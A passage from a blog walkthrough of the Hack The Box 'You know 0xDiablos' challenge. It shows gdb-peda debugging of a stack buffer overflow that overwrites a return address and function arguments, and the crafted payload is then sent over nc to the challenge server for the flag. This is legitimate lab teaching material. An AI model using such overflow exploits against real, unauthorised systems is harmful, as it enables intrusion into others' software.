</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>gdb-peda$ disass flag
</span></span><span class=line><span class=cl>Dump of assembler code <span class=k>for</span> <span class=k>function</span> flag:
</span></span><span class=line><span class=cl>   0x080491e2 &lt;+0&gt;:	push   ebp
</span></span><span class=line><span class=cl>   0x080491e3 &lt;+1&gt;:	mov    ebp,esp
</span></span><span class=line><span class=cl>   0x080491e5 &lt;+3&gt;:	push   <span class=nv>ebx</span>
</span></span><span class=line><span class=cl><span class=o>=</span>&gt; 0x080491e6 &lt;+4&gt;:	sub    esp,0x54
</span></span><span class=line><span class=cl>   0x080491e9 &lt;+7&gt;:	call   0x8049120 &lt;__x86.get_pc_thunk.bx&gt;
</span></span><span class=line><span class=cl>   0x080491ee &lt;+12&gt;:	add    ebx,0x2e12
</span></span><span class=line><span class=cl>   0x080491f4 &lt;+18&gt;:	sub    esp,0x8
</span></span><span class=line><span class=cl>   0x080491f7 &lt;+21&gt;:	lea    eax,<span class=o>[</span>ebx-0x1ff8<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x080491fd &lt;+27&gt;:	push   eax
</span></span><span class=line><span class=cl>   0x080491fe &lt;+28&gt;:	lea    eax,<span class=o>[</span>ebx-0x1ff6<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x08049204 &lt;+34&gt;:	push   eax
</span></span><span class=line><span class=cl>   0x08049205 &lt;+35&gt;:	call   0x80490b0 &lt;fopen@plt&gt;
</span></span><span class=line><span class=cl>   0x0804920a &lt;+40&gt;:	add    esp,0x10
</span></span><span class=line><span class=cl>   0x0804920d &lt;+43&gt;:	mov    DWORD PTR <span class=o>[</span>ebp-0xc<span class=o>]</span>,eax
</span></span><span class=line><span class=cl>   0x08049210 &lt;+46&gt;:	cmp    DWORD PTR <span class=o>[</span>ebp-0xc<span class=o>]</span>,0x0
</span></span><span class=line><span class=cl>   0x08049214 &lt;+50&gt;:	jne    0x8049232 &lt;flag+80&gt;
</span></span><span class=line><span class=cl>   0x08049216 &lt;+52&gt;:	sub    esp,0xc
</span></span><span class=line><span class=cl>   0x08049219 &lt;+55&gt;:	lea    eax,<span class=o>[</span>ebx-0x1fec<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x0804921f &lt;+61&gt;:	push   eax
</span></span><span class=line><span class=cl>   0x08049220 &lt;+62&gt;:	call   0x8049070 &lt;puts@plt&gt;
</span></span><span class=line><span class=cl>   0x08049225 &lt;+67&gt;:	add    esp,0x10
</span></span><span class=line><span class=cl>   0x08049228 &lt;+70&gt;:	sub    esp,0xc
</span></span><span class=line><span class=cl>   0x0804922b &lt;+73&gt;:	push   0x0
</span></span><span class=line><span class=cl>   0x0804922d &lt;+75&gt;:	call   0x8049080 &lt;exit@plt&gt;
</span></span><span class=line><span class=cl>   0x08049232 &lt;+80&gt;:	sub    esp,0x4
</span></span><span class=line><span class=cl>   0x08049235 &lt;+83&gt;:	push   DWORD PTR <span class=o>[</span>ebp-0xc<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x08049238 &lt;+86&gt;:	push   0x40
</span></span><span class=line><span class=cl>   0x0804923a &lt;+88&gt;:	lea    eax,<span class=o>[</span>ebp-0x4c<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x0804923d &lt;+91&gt;:	push   eax
</span></span><span class=line><span class=cl>   0x0804923e &lt;+92&gt;:	call   0x8049050 &lt;fgets@plt&gt;
</span></span><span class=line><span class=cl>   0x08049243 &lt;+97&gt;:	add    esp,0x10
</span></span><span class=line><span class=cl>   0x08049246 &lt;+100&gt;:	cmp    DWORD PTR <span class=o>[</span>ebp+0x8<span class=o>]</span>,0xdeadbeef
</span></span><span class=line><span class=cl>   0x0804924d &lt;+107&gt;:	jne    0x8049269 &lt;flag+135&gt;
</span></span><span class=line><span class=cl>   0x0804924f &lt;+109&gt;:	cmp    DWORD PTR <span class=o>[</span>ebp+0xc<span class=o>]</span>,0xc0ded00d
</span></span><span class=line><span class=cl>   0x08049256 &lt;+116&gt;:	jne    0x804926c &lt;flag+138&gt;
</span></span><span class=line><span class=cl>   0x08049258 &lt;+118&gt;:	sub    esp,0xc
</span></span><span class=line><span class=cl>   0x0804925b &lt;+121&gt;:	lea    eax,<span class=o>[</span>ebp-0x4c<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x0804925e &lt;+124&gt;:	push   eax
</span></span><span class=line><span class=cl>   0x0804925f &lt;+125&gt;:	call   0x8049030 &lt;printf@plt&gt;
</span></span><span class=line><span class=cl>   0x08049264 &lt;+130&gt;:	add    esp,0x10
</span></span><span class=line><span class=cl>   0x08049267 &lt;+133&gt;:	jmp    0x804926d &lt;flag+139&gt;
</span></span><span class=line><span class=cl>   0x08049269 &lt;+135&gt;:	nop
</span></span><span class=line><span class=cl>   0x0804926a &lt;+136&gt;:	jmp    0x804926d &lt;flag+139&gt;
</span></span><span class=line><span class=cl>   0x0804926c &lt;+138&gt;:	nop
</span></span><span class=line><span class=cl>   0x0804926d &lt;+139&gt;:	mov    ebx,DWORD PTR <span class=o>[</span>ebp-0x4<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x08049270 &lt;+142&gt;:	leave  
</span></span><span class=line><span class=cl>   0x08049271 &lt;+143&gt;:	ret    
</span></span><span class=line><span class=cl>End of assembler dump.
</span></span><span class=line><span class=cl>gdb-peda$ b *0x08049246
</span></span><span class=line><span class=cl>Breakpoint <span class=m>2</span> at 0x8049246
</span></span><span class=line><span class=cl>gdb-peda$ b *0x0804924f
</span></span><span class=line><span class=cl>Breakpoint <span class=m>3</span> at 0x804924f
</span></span><span class=line><span class=cl>gdb-peda$
</span></span></code></pre></div><p>Then we <strong>continue</strong> with the <strong>execution</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># gdb command</span>
</span></span><span class=line><span class=cl>c
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>gdb-peda$ c
</span></span><span class=line><span class=cl>Continuing.
</span></span><span class=line><span class=cl><span class=o>[</span>----------------------------------registers-----------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>EAX: 0xffffd010 <span class=o>(</span><span class=s2>&#34;SUCCESS&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>EBX: 0x804c000 --&gt; 0x804bf10 --&gt; 0x1 
</span></span><span class=line><span class=cl>ECX: 0x0 
</span></span><span class=line><span class=cl>EDX: 0xfbad2498 
</span></span><span class=line><span class=cl>ESI: 0xf7faa000 --&gt; 0x1e3d6c 
</span></span><span class=line><span class=cl>EDI: 0xf7faa000 --&gt; 0x1e3d6c 
</span></span><span class=line><span class=cl>EBP: 0xffffd05c <span class=o>(</span><span class=s2>&#34;AAAAAAAAﾭ\336\r\320\336\300&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>ESP: 0xffffd004 <span class=o>(</span><span class=s1>&#39;A&#39;</span> &lt;repeats <span class=m>12</span> times&gt;, <span class=s2>&#34;SUCCESS&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>EIP: 0x8049246 <span class=o>(</span>&lt;flag+100&gt;:	cmp    DWORD PTR <span class=o>[</span>ebp+0x8<span class=o>]</span>,0xdeadbeef<span class=o>)</span>
</span></span><span class=line><span class=cl>EFLAGS: 0x282 <span class=o>(</span>carry parity adjust zero SIGN <span class=nb>trap</span> INTERRUPT direction overflow<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-------------------------------------code-------------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x804923d &lt;flag+91&gt;:	push   eax
</span></span><span class=line><span class=cl>   0x804923e &lt;flag+92&gt;:	call   0x8049050 &lt;fgets@plt&gt;
</span></span><span class=line><span class=cl>   0x8049243 &lt;flag+97&gt;:	add    esp,0x10
</span></span><span class=line><span class=cl><span class=o>=</span>&gt; 0x8049246 &lt;flag+100&gt;:	cmp    DWORD PTR <span class=o>[</span>ebp+0x8<span class=o>]</span>,0xdeadbeef
</span></span><span class=line><span class=cl>   0x804924d &lt;flag+107&gt;:	jne    0x8049269 &lt;flag+135&gt;
</span></span><span class=line><span class=cl>   0x804924f &lt;flag+109&gt;:	cmp    DWORD PTR <span class=o>[</span>ebp+0xc<span class=o>]</span>,0xc0ded00d
</span></span><span class=line><span class=cl>   0x8049256 &lt;flag+116&gt;:	jne    0x804926c &lt;flag+138&gt;
</span></span><span class=line><span class=cl>   0x8049258 &lt;flag+118&gt;:	sub    esp,0xc
</span></span><span class=line><span class=cl><span class=o>[</span>------------------------------------stack-------------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>0000<span class=p>|</span> 0xffffd004 <span class=o>(</span><span class=s1>&#39;A&#39;</span> &lt;repeats <span class=m>12</span> times&gt;, <span class=s2>&#34;SUCCESS&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0004<span class=p>|</span> 0xffffd008 <span class=o>(</span><span class=s2>&#34;AAAAAAAASUCCESS&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0008<span class=p>|</span> 0xffffd00c <span class=o>(</span><span class=s2>&#34;AAAASUCCESS&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0012<span class=p>|</span> 0xffffd010 <span class=o>(</span><span class=s2>&#34;SUCCESS&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0016<span class=p>|</span> 0xffffd014 --&gt; 0x535345 <span class=o>(</span><span class=s1>&#39;ESS&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0020<span class=p>|</span> 0xffffd018 <span class=o>(</span><span class=s1>&#39;A&#39;</span> &lt;repeats <span class=m>56</span> times&gt;, <span class=s2>&#34;\260\341\004\b&#34;</span>, <span class=s1>&#39;A&#39;</span> &lt;repeats <span class=m>16</span> times&gt;, <span class=s2>&#34;ﾭ\336\r\320\336\300&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0024<span class=p>|</span> 0xffffd01c <span class=o>(</span><span class=s1>&#39;A&#39;</span> &lt;repeats <span class=m>52</span> times&gt;, <span class=s2>&#34;\260\341\004\b&#34;</span>, <span class=s1>&#39;A&#39;</span> &lt;repeats <span class=m>16</span> times&gt;, <span class=s2>&#34;ﾭ\336\r\320\336\300&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0028<span class=p>|</span> 0xffffd020 <span class=o>(</span><span class=s1>&#39;A&#39;</span> &lt;repeats <span class=m>48</span> times&gt;, <span class=s2>&#34;\260\341\004\b&#34;</span>, <span class=s1>&#39;A&#39;</span> &lt;repeats <span class=m>16</span> times&gt;, <span class=s2>&#34;ﾭ\336\r\320\336\300&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>------------------------------------------------------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>Legend: code, data, rodata, value
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Breakpoint 2, 0x08049246 in flag <span class=o>()</span>
</span></span><span class=line><span class=cl>gdb-peda$
</span></span></code></pre></div><p>Let&rsquo;s check the <strong>registers</strong> if they were correctly <strong>overwritten</strong> or not.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># gdb command</span>
</span></span><span class=line><span class=cl>x/xw <span class=nv>$ebp</span>+0x8
</span></span><span class=line><span class=cl>x/xw <span class=nv>$ebp</span>+0xc
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>gdb-peda$ x/xw <span class=nv>$ebp</span>+0x8
</span></span><span class=line><span class=cl>0xffffd064:	0xdeadbeef
</span></span><span class=line><span class=cl>gdb-peda$ x/xw <span class=nv>$ebp</span>+0xc
</span></span><span class=line><span class=cl>0xffffd068:	0xc0ded00d
</span></span><span class=line><span class=cl>gdb-peda$
</span></span></code></pre></div><p>Great, they are <strong>filled</strong> exactly as how we wanted. Once we <strong>continue</strong> with the <strong>execution</strong> and over the two breakpoints we previously set, our flag&rsquo;s value -<em>SUCCESS</em>- is displayed for us briefly, right before the program crashes.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>gdb-peda$ c
</span></span><span class=line><span class=cl>Continuing.
</span></span><span class=line><span class=cl><span class=o>[</span>----------------------------------registers-----------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>EAX: 0xffffd010 <span class=o>(</span><span class=s2>&#34;SUCCESS&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>EBX: 0x804c000 --&gt; 0x804bf10 --&gt; 0x1 
</span></span><span class=line><span class=cl>ECX: 0x0 
</span></span><span class=line><span class=cl>EDX: 0xfbad2498 
</span></span><span class=line><span class=cl>ESI: 0xf7faa000 --&gt; 0x1e3d6c 
</span></span><span class=line><span class=cl>EDI: 0xf7faa000 --&gt; 0x1e3d6c 
</span></span><span class=line><span class=cl>EBP: 0xffffd05c <span class=o>(</span><span class=s2>&#34;AAAAAAAAﾭ\336\r\320\336\300&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>ESP: 0xffffd004 <span class=o>(</span><span class=s1>&#39;A&#39;</span> &lt;repeats <span class=m>12</span> times&gt;, <span class=s2>&#34;SUCCESS&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>EIP: 0x804924f <span class=o>(</span>&lt;flag+109&gt;:	cmp    DWORD PTR <span class=o>[</span>ebp+0xc<span class=o>]</span>,0xc0ded00d<span class=o>)</span>
</span></span><span class=line><span class=cl>EFLAGS: 0x246 <span class=o>(</span>carry PARITY adjust ZERO sign <span class=nb>trap</span> INTERRUPT direction overflow<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-------------------------------------code-------------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x8049243 &lt;flag+97&gt;:	add    esp,0x10
</span></span><span class=line><span class=cl>   0x8049246 &lt;flag+100&gt;:	cmp    DWORD PTR <span class=o>[</span>ebp+0x8<span class=o>]</span>,0xdeadbeef
</span></span><span class=line><span class=cl>   0x804924d &lt;flag+107&gt;:	jne    0x8049269 &lt;flag+135&gt;
</span></span><span class=line><span class=cl><span class=o>=</span>&gt; 0x804924f &lt;flag+109&gt;:	cmp    DWORD PTR <span class=o>[</span>ebp+0xc<span class=o>]</span>,0xc0ded00d
</span></span><span class=line><span class=cl>   0x8049256 &lt;flag+116&gt;:	jne    0x804926c &lt;flag+138&gt;
</span></span><span class=line><span class=cl>   0x8049258 &lt;flag+118&gt;:	sub    esp,0xc
</span></span><span class=line><span class=cl>   0x804925b &lt;flag+121&gt;:	lea    eax,<span class=o>[</span>ebp-0x4c<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x804925e &lt;flag+124&gt;:	push   eax
</span></span><span class=line><span class=cl><span class=o>[</span>------------------------------------stack-------------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>0000<span class=p>|</span> 0xffffd004 <span class=o>(</span><span class=s1>&#39;A&#39;</span> &lt;repeats <span class=m>12</span> times&gt;, <span class=s2>&#34;SUCCESS&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0004<span class=p>|</span> 0xffffd008 <span class=o>(</span><span class=s2>&#34;AAAAAAAASUCCESS&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0008<span class=p>|</span> 0xffffd00c <span class=o>(</span><span class=s2>&#34;AAAASUCCESS&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0012<span class=p>|</span> 0xffffd010 <span class=o>(</span><span class=s2>&#34;SUCCESS&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0016<span class=p>|</span> 0xffffd014 --&gt; 0x535345 <span class=o>(</span><span class=s1>&#39;ESS&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0020<span class=p>|</span> 0xffffd018 <span class=o>(</span><span class=s1>&#39;A&#39;</span> &lt;repeats <span class=m>56</span> times&gt;, <span class=s2>&#34;\260\341\004\b&#34;</span>, <span class=s1>&#39;A&#39;</span> &lt;repeats <span class=m>16</span> times&gt;, <span class=s2>&#34;ﾭ\336\r\320\336\300&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0024<span class=p>|</span> 0xffffd01c <span class=o>(</span><span class=s1>&#39;A&#39;</span> &lt;repeats <span class=m>52</span> times&gt;, <span class=s2>&#34;\260\341\004\b&#34;</span>, <span class=s1>&#39;A&#39;</span> &lt;repeats <span class=m>16</span> times&gt;, <span class=s2>&#34;ﾭ\336\r\320\336\300&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0028<span class=p>|</span> 0xffffd020 <span class=o>(</span><span class=s1>&#39;A&#39;</span> &lt;repeats <span class=m>48</span> times&gt;, <span class=s2>&#34;\260\341\004\b&#34;</span>, <span class=s1>&#39;A&#39;</span> &lt;repeats <span class=m>16</span> times&gt;, <span class=s2>&#34;ﾭ\336\r\320\336\300&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>------------------------------------------------------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>Legend: code, data, rodata, value
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Breakpoint 3, 0x0804924f in flag <span class=o>()</span>
</span></span><span class=line><span class=cl>gdb-peda$ c
</span></span><span class=line><span class=cl>Continuing.
</span></span><span class=line><span class=cl>SUCCESS
</span></span><span class=line><span class=cl>Program received signal SIGSEGV, Segmentation fault.
</span></span><span class=line><span class=cl><span class=o>[</span>----------------------------------registers-----------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>EAX: 0x7 
</span></span><span class=line><span class=cl>EBX: 0x41414141 <span class=o>(</span><span class=s1>&#39;AAAA&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>ECX: 0x7 
</span></span><span class=line><span class=cl>EDX: 0xffffffff 
</span></span><span class=line><span class=cl>ESI: 0xf7faa000 --&gt; 0x1e3d6c 
</span></span><span class=line><span class=cl>EDI: 0xf7faa000 --&gt; 0x1e3d6c 
</span></span><span class=line><span class=cl>EBP: 0x41414141 <span class=o>(</span><span class=s1>&#39;AAAA&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>ESP: 0xffffd064 --&gt; 0xdeadbeef 
</span></span><span class=line><span class=cl>EIP: 0x41414141 <span class=o>(</span><span class=s1>&#39;AAAA&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>EFLAGS: 0x10282 <span class=o>(</span>carry parity adjust zero SIGN <span class=nb>trap</span> INTERRUPT direction overflow<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-------------------------------------code-------------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>Invalid <span class=nv>$PC</span> address: 0x41414141
</span></span><span class=line><span class=cl><span class=o>[</span>------------------------------------stack-------------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>0000<span class=p>|</span> 0xffffd064 --&gt; 0xdeadbeef 
</span></span><span class=line><span class=cl>0004<span class=p>|</span> 0xffffd068 --&gt; 0xc0ded00d 
</span></span><span class=line><span class=cl>0008<span class=p>|</span> 0xffffd06c --&gt; 0x300 
</span></span><span class=line><span class=cl>0012<span class=p>|</span> 0xffffd070 --&gt; 0xffffd090 --&gt; 0x1 
</span></span><span class=line><span class=cl>0016<span class=p>|</span> 0xffffd074 --&gt; 0x0 
</span></span><span class=line><span class=cl>0020<span class=p>|</span> 0xffffd078 --&gt; 0x0 
</span></span><span class=line><span class=cl>0024<span class=p>|</span> 0xffffd07c --&gt; 0xf7de0e46 <span class=o>(</span>&lt;__libc_start_main+262&gt;:	add    esp,0x10<span class=o>)</span>
</span></span><span class=line><span class=cl>0028<span class=p>|</span> 0xffffd080 --&gt; 0xf7faa000 --&gt; 0x1e3d6c 
</span></span><span class=line><span class=cl><span class=o>[</span>------------------------------------------------------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>Legend: code, data, rodata, value
</span></span><span class=line><span class=cl>Stopped reason: SIGSEGV
</span></span><span class=line><span class=cl>0x41414141 in ?? <span class=o>()</span>
</span></span><span class=line><span class=cl>gdb-peda$ 
</span></span></code></pre></div><h2 id=verifying-the-results><strong>VERIFYING-THE-RESULTS</strong><a hidden class=anchor aria-hidden=true href=#verifying-the-results>#</a></h2><p>Our payload appears to be working, so let&rsquo;s try it <strong>directly</strong> on our <strong>executable</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>cat payload.txt <span class=p>|</span> ./vuln
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cat payload.txt <span class=p>|</span> ./vuln 
</span></span><span class=line><span class=cl>You know who are 0xDiablos: 
</span></span><span class=line><span class=cl>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���Aﾭ�
</span></span><span class=line><span class=cl>SUCCESSSegmentation fault
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Great, it works. All that&rsquo;s left for us now is to <strong>spawn</strong> the <strong>challenge machine</strong> and <strong>submit</strong> our <strong>payload</strong> to get the <strong>flag</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>cat payload.txt <span class=p>|</span> nc &lt;challenge-box-ip&gt; &lt;challenge-box-port&gt;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cat payload.txt <span class=p>|</span> nc 178.62.78.169 <span class=m>30660</span>
</span></span><span class=line><span class=cl>You know who are 0xDiablos: 
</span></span><span class=line><span class=cl>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���Aﾭ�
</span></span><span class=line><span class=cl>&lt;flag&gt;┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ 
</span></span></code></pre></div><p>Finally, we <strong>submit</strong> the <strong>flag</strong> and <strong>review</strong> the challenge before <strong>terminating</strong> the challenge box.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://bluewalle.github.io/tags/htb/>htb</a></li><li><a href=https://bluewalle.github.io/tags/walkthrough/>walkthrough</a></li><li><a href=https://bluewalle.github.io/tags/you-know-0xdiablos/>you-know-0xdiablos</a></li><li><a href=https://bluewalle.github.io/tags/easy-box/>easy-box</a></li><li><a href=https://bluewalle.github.io/tags/reverse-engineering/>reverse-engineering</a></li><li><a href=https://bluewalle.github.io/tags/static-analysis/>static-analysis</a></li><li><a href=https://bluewalle.github.io/tags/ghidra/>ghidra</a></li><li><a href=https://bluewalle.github.io/tags/pwntools/>pwntools</a></li><li><a href=https://bluewalle.github.io/tags/buffer-overflow/>buffer-overflow</a></li><li><a href=https://bluewalle.github.io/tags/smashing-the-stack/>smashing-the-stack</a></li><li><a href=https://bluewalle.github.io/tags/gdb-peda/>gdb-peda</a></li><li><a href=https://bluewalle.github.io/tags/challenge-box/>challenge-box</a></li></ul></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>